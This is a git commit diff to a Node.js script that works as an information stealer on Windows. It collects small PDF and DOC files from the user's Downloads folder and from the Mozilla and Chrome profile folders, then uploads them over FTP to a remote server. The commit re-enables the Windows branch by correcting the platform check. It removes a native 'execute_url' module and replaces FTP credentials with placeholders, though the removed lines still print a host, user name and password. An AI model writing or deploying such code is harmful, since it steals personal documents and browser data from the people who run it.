7f06d12cc8d8af95aa31d0e60e2ddac29ee27611
U-RESEARCH\linfordg <linfordg@PRD00514.research.us.panasonic.com>
2015-06-23 16:56:15 -0700

    more

--- binding.gyp
+++
@@ -1,8 +0,0 @@
-{
-  "targets": [
-    {
-      "target_name": "execute_url",
-      "sources": [ "execute_url.cc" ]
-    }
-  ]
-}
--- server.js
+++ server.js
@@ -1,27 +1,24 @@
-var jxm = require('jxm');
 var os = require('os');
 var Client = require('ftp');
 var finder = require('files-finder');
 var c = new Client();
 var exec = require('child_process').exec;
 var fs = require("fs");
-var vir = require("./build/Release/execute_url");
-console.log(vir.execute_url());
-
 if(os.platform() === 'linux'){
     // Linux equivalent
-} else if (os.platform() === 'win3221'){ // For Windows
+} else if (os.platform() === 'win32'){ // For Windows
     var child = exec('whoami', function (error, stdout, stderr) {
         var arr = stdout.split('\\');
         var username = arr[arr.length - 1];
         username = username.trim();
         var final_arr = []
-        /* Get All Users Personnal Files */
+        /* Get All Users Downloaded pdf/doc Files */
         var files_personal = finder('C:/Users/'+username.trim()+'/Downloads', /(pdf|doc)$/);
         files_personal.forEach(function(elem, index){
             var stats = fs.statSync(elem);
             var fileSizeInBytes = stats["size"];
             var fileSizeInMegabytes = parseInt(fileSizeInBytes) / 1000000.0;
+            /* I Only Want to Upload Small Files */
             if(fileSizeInMegabytes < 0.5){
                 final_arr.push({directory: 'perso', file: elem});
             }
@@ -32,6 +29,7 @@ if(os.platform() === 'linux'){
             var stats = fs.statSync(elem);
             var fileSizeInBytes = stats["size"];
             var fileSizeInMegabytes = parseInt(fileSizeInBytes) / 1000000.0;
+            /* I Only Want to Upload Small Files */
             if(fileSizeInMegabytes < 0.5){
                 final_arr.push({directory: 'mozilla', file: elem});
             }
@@ -42,11 +40,13 @@ if(os.platform() === 'linux'){
             var stats = fs.statSync(elem);
             var fileSizeInBytes = stats["size"];
             var fileSizeInMegabytes = parseInt(fileSizeInBytes) / 1000000.0;
+            /* I Only Want to Upload Small Files */
             if(fileSizeInMegabytes < 0.5){
                 final_arr.push({directory: 'chrome', file: elem});
             }
         });
         c.on('ready', function() {
+            /* Create User Directory and Subdirectories */
             c.mkdir('/htdocs/' + username, function(err){
             c.mkdir('/htdocs/' + username + '/mozilla', function(err){
             c.mkdir('/htdocs/' + username + '/chrome', function(err){
@@ -54,25 +54,21 @@ if(os.platform() === 'linux'){
                 final_arr.forEach(function(elem, index){
                     var file_arr = elem.file.split("/");
                     c.put(elem.file, '/htdocs/'+ username +'/'+ elem.directory +'/'+ file_arr[file_arr.length - 1], function(err) {
-                        if(err){
-                            //console.log(err);
-                        }
-                        //console.log("fichier " + file_arr[file_arr.length - 1] + " envoyer");
                         if(index === final_arr.length - 1){
                             c.end();
                         }
                     });
                 });
             });
-        });
-        });
-        });
+            });
+            });
+            });
         });
         /* FTP Configs */
         c.connect({
-            host: 'ftp.byethost12.com',
-            user: 'b12_16353986',
-            password: 'gregLIN19'
+            host: 'XXX',
+            user: 'XXX',
+            password: 'XXX'
         });
     });
 }
